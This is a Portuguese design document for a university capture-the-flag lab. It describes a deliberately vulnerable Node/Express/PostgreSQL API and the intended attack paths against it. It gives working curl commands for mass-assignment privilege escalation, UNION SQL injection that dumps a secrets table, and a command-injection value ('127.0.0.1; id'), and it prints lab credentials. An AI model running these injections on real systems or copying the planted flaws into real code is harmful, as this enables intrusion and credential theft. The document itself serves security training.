# Documentação do Back-end API REST + PostgreSQL (Integrante 3)
**Tema:** Red Team Universitário — *SIGAA-Next / LabSec UnB (Ambiente de Homologação STI)*
**Stack:** Node.js + Express + TypeScript + Prisma ORM + PostgreSQL 16 (Porta `5432`)

---

## 1. Visão Geral e Portas Expostas

| Porta | Serviço | Função no CTF |
| :--- | :--- | :--- |
| **`3000` (ou `80`)** | Node.js / Express (`sigaa-next-api`) | Serve os arquivos estáticos do Front-end (`/frontend`) e responde pelas rotas da API REST (`/api/v1/...`). |
| **`5432`** | PostgreSQL 16 (`sigaa-next-postgres`) | Banco de dados relacional do portal acadêmico. Permite exploração via **SQL Injection** na API ou conexão direta via cliente `psql` caso o atacante descubra as credenciais de homologação. |

---

## 2. Contrato de Endpoints para o Front-end (Integrante 2)

O servidor Express já está configurado para servir automaticamente a pasta `/home/alan-henrique/CTF/trabalhoFinal/frontend` na raiz (`/`).

### `GET /api/v1/staff` (Listagem da Equipe do STI)
- **O que o Front-end deve renderizar no HTML:** Apenas `nome`, `matricula`, `cargo`, `departamento` e `email` dos itens onde `visivel_front === true`.
- **O que vem escondido no JSON (Aba Network do DevTools — Vuln #1: *Excessive Data Exposure*):**
  Cada objeto traz o campo `_debug_internal` contendo:
  - `login_linux`: `"estagiario_sti"` (no ID `104`) e `"coord_redes"` (no ID `102`)
  - `nota_privada`: Pistas sobre a chave SSH no FTP, o endpoint de rascunho `/api/v1/users/104/drafts` e um alerta da DBA Camila (`visivel_front: false`) sobre a rota vulnerável a SQL Injection!

### `GET /api/v1/courses/search?dept=CIC` (Busca de Disciplinas / Turmas)
- **O que o Front-end deve fazer:** Um filtro ou select por departamento (`CIC`, `ENE`, `MAT`) que faz `fetch('/api/v1/courses/search?dept=' + dept)` e exibe a tabela de disciplinas (`codigo`, `nome`, `professor`, `semestre`, `vagas`).

### `PUT /api/v1/profile` (Preferências de Tema do Portal)
- **O que o Front-end deve fazer:** Um botão de alternar tema (Claro/Escuro) que envia:
  ```json
  { "theme": "dark" }
  ```
- **O que a API responde:** Retorna o objeto `session` atualizado e um `token` JWT assinado.

---

## 3. Os Dois Caminhos de Exploração até o Foothold (`estagiario_sti`)

Para tornar o CTF mais rico e dinâmico, o Back-end oferece **duas ramificações independentes** para o jogador conseguir a **Passphrase da chave SSH (`id_rsa_estagiario_sti.enc`)** e a senha de contingência do usuário `estagiario_sti`:

### 🅰️ Caminho Principal (API Security: DevTools $\rightarrow$ Mass Assignment $\rightarrow$ Header Spoofing)
1. **Enumeração no DevTools (`GET /api/v1/staff` e `GET /api/v1/users/104/drafts`)**:
   O jogador inspeciona a aba *Network*, vê o `_debug_internal` do bolsista Lucas (`id: 104`) e acessa `/api/v1/users/104/drafts`. Lá descobre que `PUT /api/v1/profile` usa `Object.assign` sem filtro.
2. **Escalação de Privilégio na API via Mass Assignment (`PUT /api/v1/profile`)**:
   ```bash
   curl -s -X PUT http://localhost:3000/api/v1/profile \
     -H "Content-Type: application/json" \
     -d '{"theme": "dark", "role": "admin"}'
   ```
   A API devolve um **Token JWT** com `"role": "admin"` (e atualiza o registro no banco).
3. **Acesso ao Diagnóstico Admin (`POST /api/v1/admin/system-check`)**:
   Combinando o Token JWT de `admin` com o Header descoberto no Banner do SSH (`X-Origin-System: SGI-v2`):
   ```bash
   curl -s -X POST http://localhost:3000/api/v1/admin/system-check \
     -H "Authorization: Bearer <TOKEN_JWT>" \
     -H "X-Origin-System: SGI-v2" \
     -H "Content-Type: application/json" \
     -d '{"target_host": "127.0.0.1"}'
   ```
   **Resultado:** O JSON retorna os registros da tabela `sys_maintenance_vault` contendo a passphrase `UnB_ST1_H0m0l0g_2026!#` e também executa o `ping` (permitindo *Command Injection* opcional no campo `target_host`, ex: `"127.0.0.1; id"`).

---

### 🅱️ Caminho Alternativo / Ramificação SQL (SQL Injection via Prisma Raw ou Porta `5432`)
1. **Descoberta da Pista**:
   No JSON de `GET /api/v1/staff`, a DBA Camila Rocha (`id: 105`, oculta no front-end com `visivel_front: false`) deixou na `nota_privada`:
   > *"ATENÇÃO: A busca legada de turmas (/api/v1/courses/search?dept=...) ainda usa query raw concatenada!"*
2. **Exploração via UNION SQL Injection na API**:
   Embora a aplicação use Prisma ORM, a rota `/api/v1/courses/search` utiliza `prisma.$queryRawUnsafe()`. O jogador pode extrair diretamente o cofre de senhas do PostgreSQL:
   ```bash
   curl -G "http://localhost:3000/api/v1/courses/search" \
     --data-urlencode "dept=CIC' UNION SELECT id, service_name, username, secret_value, description, '2026.2', 1 FROM sys_maintenance_vault--"
   ```
   Ou listar todas as tabelas do PostgreSQL:
   ```bash
   curl -G "http://localhost:3000/api/v1/courses/search" \
     --data-urlencode "dept=CIC' UNION SELECT 1, table_name, table_schema, 'a', 'b', 'c', 1 FROM information_schema.tables WHERE table_schema='public'--"
   ```
3. **Conexão Direta na Porta `5432` (PostgreSQL)**:
   Se a Pessoa 1 quiser deixar parte da string de conexão ou se o atacante extrair variáveis, a porta `5432` está aberta no container (`psql -h <IP> -p 5432 -U sigaa_ro_audit -d sigaa_next`, senha `unb_homolog_5432`), onde o jogador pode rodar `SELECT * FROM sys_maintenance_vault;` ou até mesmo fazer `UPDATE staff_members SET role = 'admin' WHERE id = 104;` para destravar o endpoint de admin!

---

## 4. Alinhamento com o Integrante 1 (Infra / FTP / SSH)

Para que as pistas se encaixem perfeitamente, passe estes valores para o **Integrante 1**:
- **Banner do SSH (`/etc/issue.net`)**: Deve mencionar o header **`X-Origin-System: SGI-v2`** e o usuário **`estagiario_sti`**.
- **Chave SSH no FTP (`id_rsa_estagiario_sti.enc`)**: Deve ser gerada com a passphrase **`UnB_ST1_H0m0l0g_2026!#`** (ou se ele definir outra, basta alterar a variável `SSH_KEY_PASSPHRASE` no `docker-compose.yml`).
- **Senha do usuário Linux `estagiario_sti`**: **`estagiario@sigaa2026`** (configurada via variável `ESTAGIARIO_SSH_PASS`).
